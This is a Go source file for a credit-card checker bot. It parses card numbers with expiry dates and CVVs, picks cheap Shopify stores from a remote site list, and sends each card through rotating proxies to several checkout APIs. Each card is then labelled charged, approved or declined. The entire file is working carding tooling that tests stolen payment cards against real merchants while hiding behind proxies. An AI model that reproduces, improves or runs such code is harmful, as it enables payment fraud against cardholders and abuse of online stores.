package main

import (
        "encoding/json"
        "fmt"
        "io"
        "math/rand"
        "net/http"
        "net/url"
        "regexp"
        "strconv"
        "strings"
        "sync/atomic"
        "time"
)

// ──────────────────────── config ─────────────────────────────────────

const defaultShopURL = "https://gpzb9u-u9.myshopify.com"
const path = "test.txt"
const proxyPath = "px.txt"

//const workingSitesAPI = ""

const workingSitesAPI = "https://sitemanager-production.up.railway.app/sites/working"
const siteManagerRecheckURL = "https://sitemanager-production.up.railway.app/sites/verify/all"
const maxSiteAmount = 15.0

// API endpoints (load-balanced)
var apiEndpoints = []string{
        "https://api-production-e11fe.up.railway.app/shopify",
        "https://api-production-cd88.up.railway.app/shopify",
        "https://api-production-2bea.up.railway.app/shopify",
        "https://api-production-6cab.up.railway.app/shopify",
        "https://api-production-ed3a.up.railway.app/shopify",
}

// ──────────────────────── CheckResult ─────────────────────────────────

type CheckStatus int

const (
        StatusCharged  CheckStatus = iota // ORDER_PLACED
        StatusApproved                    // OTP_REQUIRED, INSUFFICIENT_FUNDS
        StatusDeclined                    // CARD_DECLINED, etc.
        StatusError                       // could not complete checkout flow
)

type CheckResult struct {
        Card       string
        Status     CheckStatus
        StatusCode string // e.g. ORDER_PLACED, CARD_DECLINED, etc.
        Amount     string // totalAmount charged
        Currency   string
        SiteName   string // shop domain without https://
        ShopURL    string
        Gateway    string // e.g. "Shopify Payments"
        Error      error  // non-nil for StatusError / StatusDeclined
        Retryable  bool   // true if a different store might succeed
}

// ──────────────────────── API response model ─────────────────────────

type APIResponse struct {
        Gateway  string  `json:"Gateway"`
        Price    float64 `json:"Price"`
        Response string  `json:"Response"`
        Status   bool    `json:"Status"`
        CC       string  `json:"cc"`
}

// ──────────────────────── Shopify JSON models ────────────────────────

type WorkingSite struct {
        URL    string
        Amount float64
}

func chooseAffordableSite(apiURL string, maxAmount float64) (WorkingSite, error) {
        endpoints := []string{apiURL}

        var lastErr error
        for _, endpoint := range endpoints {
                sites, err := fetchAffordableSites(endpoint, maxAmount)
                if err != nil {
                        lastErr = err
                        continue
                }
                if len(sites) == 0 {
                        lastErr = fmt.Errorf("no sites <= %.2f from %s", maxAmount, endpoint)
                        continue
                }
                return sites[rand.Intn(len(sites))], nil
        }

        if lastErr != nil {
                return WorkingSite{}, lastErr
        }
        return WorkingSite{}, fmt.Errorf("no site endpoint responded")
}

func fetchAffordableSites(apiURL string, maxAmount float64) ([]WorkingSite, error) {
        const pageSize = 100
        var out []WorkingSite
        seen := make(map[string]bool)

        httpClient := &http.Client{Timeout: 10 * time.Second}

        for offset := 0; ; offset += pageSize {
                pageURL := fmt.Sprintf("%s?limit=%d&offset=%d", apiURL, pageSize, offset)
                resp, err := httpClient.Get(pageURL)
                if err != nil {
                        if len(out) > 0 {
                                break
                        }
                        return nil, fmt.Errorf("GET %s: %w", pageURL, err)
                }

                body, err := io.ReadAll(resp.Body)
                resp.Body.Close()
                if err != nil {
                        if len(out) > 0 {
                                break
                        }
                        return nil, fmt.Errorf("read API body: %w", err)
                }

                if resp.StatusCode != http.StatusOK {
                        if len(out) > 0 {
                                break
                        }
                        return nil, fmt.Errorf("GET %s returned status %d", pageURL, resp.StatusCode)
                }

                bodyStr := strings.TrimSpace(string(body))
                if strings.HasPrefix(bodyStr, "<!DOCTYPE html") || strings.Contains(bodyStr, "<tbody>") {
                        sites := parseDashboardHTMLSites(bodyStr, maxAmount)
                        return sites, nil
                }

                var payload any
                if err := json.Unmarshal(body, &payload); err != nil {
                        if len(out) > 0 {
                                break
                        }
                        return nil, fmt.Errorf("parse API JSON: %w", err)
                }

                pageSites := collectObjects(payload)
                if len(pageSites) == 0 {
                        break
                }

                for _, obj := range pageSites {
                        siteURL := extractSiteURL(obj)
                        if siteURL == "" {
                                continue
                        }
                        amount, ok := extractAmount(obj)
                        if !ok || amount > maxAmount {
                                continue
                        }
                        if seen[siteURL] {
                                continue
                        }
                        seen[siteURL] = true
                        out = append(out, WorkingSite{URL: siteURL, Amount: amount})
                }

                if len(pageSites) < pageSize {
                        break
                }
        }

        if len(out) == 0 {
                return nil, fmt.Errorf("no affordable sites found in API payload")
        }
        fmt.Printf("[SITES] fetched %d affordable sites (under $%.0f)\n", len(out), maxAmount)
        return out, nil
}

func parseDashboardHTMLSites(htmlBody string, maxAmount float64) []WorkingSite {
        rowRe := regexp.MustCompile(`<a href="(https?://[^"]+)"[^>]*>[^<]*</a></td><td class="price">\$?([^<]+)</td>`)
        matches := rowRe.FindAllStringSubmatch(htmlBody, -1)

        var out []WorkingSite
        seen := make(map[string]bool)
        for _, m := range matches {
                if len(m) < 3 {
                        continue
                }
                siteURL := strings.TrimSpace(m[1])
                siteURL = strings.TrimRight(siteURL, "/")
                amount, ok := toFloat(strings.TrimSpace(m[2]))
                if !ok || amount > maxAmount {
                        continue
                }
                if seen[siteURL] {
                        continue
                }
                seen[siteURL] = true
                out = append(out, WorkingSite{URL: siteURL, Amount: amount})
        }
        return out
}

func collectObjects(v any) []map[string]any {
        out := []map[string]any{}
        switch node := v.(type) {
        case map[string]any:
                out = append(out, node)
                for _, child := range node {
                        out = append(out, collectObjects(child)...)
                }
        case []any:
                for _, child := range node {
                        out = append(out, collectObjects(child)...)
                }
        }
        return out
}

func extractSiteURL(obj map[string]any) string {
        keys := []string{"site", "url", "shop_url", "shopUrl", "shop", "domain", "website"}
        for _, k := range keys {
                raw, ok := obj[k]
                if !ok {
                        continue
                }
                s := strings.TrimSpace(fmt.Sprint(raw))
                if s == "" {
                        continue
                }
                if !strings.HasPrefix(s, "http://") && !strings.HasPrefix(s, "https://") {
                        s = "https://" + s
                }
                u, err := url.ParseRequestURI(s)
                if err != nil || u.Host == "" {
                        continue
                }
                return strings.TrimRight(u.Scheme+"://"+u.Host, "/")
        }
        return ""
}

func extractAmount(obj map[string]any) (float64, bool) {
        keys := []string{"amount", "price", "checkout_price", "value", "min_amount", "minAmount"}
        for _, k := range keys {
                raw, ok := obj[k]
                if !ok {
                        continue
                }
                if n, ok := toFloat(raw); ok {
                        return n, true
                }
        }
        return 0, false
}

func toFloat(v any) (float64, bool) {
        switch n := v.(type) {
        case float64:
                return n, true
        case int:
                return float64(n), true
        case int64:
                return float64(n), true
        case json.Number:
                f, err := n.Float64()
                return f, err == nil
        case string:
                numRe := regexp.MustCompile(`[-+]?\d*\.?\d+`)
                m := numRe.FindString(n)
                if m == "" {
                        return 0, false
                }
                f, err := strconv.ParseFloat(m, 64)
                return f, err == nil
        default:
                return 0, false
        }
}

// ──────────────────────── Card parser ────────────────────────────────

func parseCardEntry(cardEntry, filePath string) (cc, mm, yy, cvv string, err error) {
        parts := strings.Split(strings.TrimSpace(cardEntry), "|")
        if len(parts) < 4 {
                return "", "", "", "", fmt.Errorf("invalid card format: need cc|mm|yy|cvv")
        }
        cc = strings.TrimSpace(parts[0])
        mm = strings.TrimSpace(parts[1])
        yy = strings.TrimSpace(parts[2])
        cvv = strings.TrimSpace(parts[3])

        if len(cc) < 13 || len(cc) > 19 {
                return "", "", "", "", fmt.Errorf("invalid card number length: %d", len(cc))
        }
        return cc, mm, yy, cvv, nil
}

// ──────────────────────── API checker ────────────────────────────────

var apiCounter uint64

// getNextAPI returns the next API endpoint in a round-robin fashion.
func getNextAPI() string {
        idx := atomic.AddUint64(&apiCounter, 1) % uint64(len(apiEndpoints))
        return apiEndpoints[idx]
}

// formatProxyForAPI converts proxy from user format to API format.
// User may provide: host:port:user:pass or http://user:pass@host:port
// API expects: host:port:user:pass
func formatProxyForAPI(proxyURL string) string {
        proxyURL = strings.TrimSpace(proxyURL)
        if proxyURL == "" {
                return ""
        }
        // If it's already in host:port:user:pass format, use as-is
        if !strings.HasPrefix(proxyURL, "http") {
                return proxyURL
        }
        // Parse http://user:pass@host:port format
        parsed, err := url.Parse(proxyURL)
        if err != nil {
                return proxyURL
        }
        host := parsed.Host
        if parsed.User != nil {
                user := parsed.User.Username()
                pass, _ := parsed.User.Password()
                return host + ":" + user + ":" + pass
        }
        return host
}

// callCheckAPI sends a card check request to one of the API endpoints.
func callCheckAPI(siteURL, cardEntry, proxyURL string) (*APIResponse, error) {
        apiURL := getNextAPI()

        proxy := formatProxyForAPI(proxyURL)

        params := url.Values{}
        params.Set("site", siteURL)
        params.Set("cc", cardEntry)
        if proxy != "" {
                params.Set("proxy", proxy)
        }

        fullURL := apiURL + "?" + params.Encode()

        client := &http.Client{Timeout: 120 * time.Second}
        resp, err := client.Get(fullURL)
        if err != nil {
                return nil, fmt.Errorf("API request failed: %w", err)
        }
        defer resp.Body.Close()

        body, err := io.ReadAll(resp.Body)
        if err != nil {
                return nil, fmt.Errorf("reading API response: %w", err)
        }

        if resp.StatusCode != http.StatusOK {
                return nil, fmt.Errorf("API returned status %d: %s", resp.StatusCode, string(body))
        }

        var apiResp APIResponse
        if err := json.Unmarshal(body, &apiResp); err != nil {
                return nil, fmt.Errorf("parsing API response: %w (body: %s)", err, string(body))
        }

        return &apiResp, nil
}

// mapAPIResponse converts API response to CheckResult with proper status mapping.
func mapAPIResponse(apiResp *APIResponse, cardEntry, shopURL string) *CheckResult {
        siteName := strings.TrimPrefix(strings.TrimPrefix(shopURL, "https://"), "http://")

        result := &CheckResult{
                Card:     cardEntry,
                ShopURL:  shopURL,
                SiteName: siteName,
                Gateway:  apiResp.Gateway,
                Amount:   fmt.Sprintf("%.2f", apiResp.Price),
        }

        response := strings.ToUpper(strings.TrimSpace(apiResp.Response))

        switch {
        case response == "ORDER_PLACED":
                result.Status = StatusCharged
                result.StatusCode = "ORDER_PLACED"

        case response == "OTP_REQUIRED" || response == "3DS_REQUIRED":
                result.Status = StatusApproved
                result.StatusCode = response

        case response == "INSUFFICIENT_FUNDS":
                result.Status = StatusApproved
                result.StatusCode = "INSUFFICIENT_FUNDS"

        case response == "CARD_DECLINED":
                result.Status = StatusDeclined
                result.StatusCode = "CARD_DECLINED"
                result.Error = fmt.Errorf("declined: %s", response)

        case strings.Contains(response, "DECLINED"):
                result.Status = StatusDeclined
                result.StatusCode = response
                result.Error = fmt.Errorf("declined: %s", response)

        case strings.Contains(response, "STOLEN") || strings.Contains(response, "LOST"):
                result.Status = StatusDeclined
                result.StatusCode = response
                result.Error = fmt.Errorf("declined: %s", response)

        case strings.Contains(response, "EXPIRED"):
                result.Status = StatusDeclined
                result.StatusCode = response
                result.Error = fmt.Errorf("declined: %s", response)

        case strings.Contains(response, "FRAUD") || strings.Contains(response, "RISK"):
                result.Status = StatusDeclined
                result.StatusCode = response
                result.Error = fmt.Errorf("declined: %s", response)

        case strings.Contains(response, "INVALID"):
                result.Status = StatusDeclined
                result.StatusCode = response
                result.Error = fmt.Errorf("declined: %s", response)

        case strings.Contains(response, "SITE ERROR") || strings.Contains(response, "NOT SHOPIFY") || strings.Contains(response, "STATUS: 402") || strings.Contains(response, "STATUS: 404") || strings.Contains(response, "FAILED TO GET SESSION"):
                result.Status = StatusError
                result.StatusCode = response
                result.Error = fmt.Errorf("site error: %s", response)
                result.Retryable = true

        case response == "":
                result.Status = StatusError
                result.StatusCode = "EMPTY_RESPONSE"
                result.Error = fmt.Errorf("empty response from API")
                result.Retryable = true

        default:
                // Check if it looks like a card decline or a site error
                if strings.Contains(response, "CARD_DECLINED") || strings.Contains(response, "GENERIC_DECLINE") || strings.Contains(response, "INCORRECT") {
                        result.Status = StatusDeclined
                        result.StatusCode = response
                        result.Error = fmt.Errorf("declined: %s", response)
                } else {
                        // Anything else (Site errors, Cart failed, etc.) should be retried
                        result.Status = StatusError
                        result.StatusCode = response
                        result.Error = fmt.Errorf("error: %s", response)
                        result.Retryable = true
                }
        }

        // Terminal logging
        color := "\033[31m" // Red for decline/error
        statusStr := "DECLINED"
        if result.Status == StatusCharged {
                color = "\033[32m" // Green for charged
                statusStr = "CHARGED"
        } else if result.Status == StatusApproved {
                color = "\033[36m" // Cyan for approved
                statusStr = "APPROVED"
        } else if result.Status == StatusError {
                statusStr = "ERROR"
        }
        fmt.Printf("%s[CARD] %s | %s | %s | %s | %s | %s\033[0m\n", color, cardEntry, result.ShopURL, result.Gateway, statusStr, result.StatusCode, result.Amount)

        return result
}

// ──────────────────────── Main checkout function ─────────────────────
// This is called by bot.go for Shopify card checking.

func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, error) {
        siteName := strings.TrimPrefix(strings.TrimPrefix(shopURL, "https://"), "http://")

        // Validate card format
        _, _, _, _, err := parseCardEntry(cardEntry, path)
        if err != nil {
                result := &CheckResult{
                        Card:     cardEntry,
                        Status:   StatusError,
                        ShopURL:  shopURL,
                        SiteName: siteName,
                        Error:    err,
                }
                return result, err
        }

        // Try all API endpoints until one succeeds or all fail
        var apiResp *APIResponse
        var lastApiErr error

        for i := 0; i < len(apiEndpoints); i++ {
                for attempt := 0; attempt < 3; attempt++ {
                        apiResp, lastApiErr = callCheckAPI(shopURL, cardEntry, proxyURL)
                        if lastApiErr == nil {
                                break
                        }
                        if attempt < 2 {
                                time.Sleep(time.Duration(attempt+1) * 500 * time.Millisecond)
                        }
                }
                if lastApiErr == nil {
                        break
                }
                fmt.Printf("[API FAILOVER] endpoint %d/%d failed after retries: %v. Trying next...\n", i+1, len(apiEndpoints), lastApiErr)
        }

        if lastApiErr != nil {
                fmt.Printf("[API] all endpoints failed for card=%s site=%s lastErr=%v\n", cardEntry, shopURL, lastApiErr)
                result := &CheckResult{
                        Card:       cardEntry,
                        Status:     StatusError,
                        StatusCode: "API_ERROR",
                        ShopURL:    shopURL,
                        SiteName:   siteName,
                        Error:      lastApiErr,
                        Retryable:  true,
                }
                return result, lastApiErr
        }

        // Map API response to CheckResult
        result := mapAPIResponse(apiResp, cardEntry, shopURL)


        return result, result.Error
}

// ──────────────────────── Proxy Helpers ──────────────────────────────

// normalizeProxy converts various proxy formats to http://user:pass@host:port
func normalizeProxy(p string) (string, error) {
        p = strings.TrimSpace(p)
        if p == "" {
                return "", fmt.Errorf("empty proxy")
        }

        if strings.HasPrefix(p, "http://") || strings.HasPrefix(p, "https://") {
                return p, nil
        }

        parts := strings.Split(p, ":")
        switch len(parts) {
        case 2: // host:port
                return "http://" + p, nil
        case 4: // host:port:user:pass
                // URL-encode user/pass so special chars don't break url.Parse
                u := url.UserPassword(parts[2], parts[3])
                return fmt.Sprintf("http://%s@%s:%s", u.String(), parts[0], parts[1]), nil
        default:
                // Try to parse as user:pass@host:port
                if strings.Contains(p, "@") {
                        return "http://" + p, nil
                }
                return "", fmt.Errorf("invalid proxy format: %s", p)
        }
}

// testProxy checks if a proxy is working by making a request to a reliable endpoint.
func testProxy(proxyURL string) error {
        pu, err := url.Parse(proxyURL)
        if err != nil {
                return err
        }

        transport := &http.Transport{
                Proxy: http.ProxyURL(pu),
        }
        client := &http.Client{
                Transport: transport,
                Timeout:   15 * time.Second,
        }

        // Test against a stable public endpoint (httpbin.org/ip)
        resp, err := client.Get("https://httpbin.org/ip")
        if err != nil {
                return err
        }
        defer resp.Body.Close()

        if resp.StatusCode < 200 || resp.StatusCode >= 300 {
                return fmt.Errorf("bad status code: %d", resp.StatusCode)
        }

        return nil
}
